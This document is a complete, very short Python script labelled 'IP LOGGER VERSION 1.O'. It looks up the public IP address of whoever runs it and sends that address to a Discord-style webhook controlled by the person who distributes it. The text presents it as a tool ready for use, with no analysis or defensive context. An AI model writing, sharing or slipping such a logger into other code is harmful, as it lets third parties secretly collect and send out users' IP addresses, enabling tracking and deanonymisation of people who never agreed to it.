from dhooks import Webhook, Embed
import requests
server = Webhook("enter ur webhook link here")
ip = requests.get('https://api.ipify.org/').text
server.send(content=f"{ip}\n__IP LOGGER VERSION : 1.O__\nTHANKS FOR USING!")
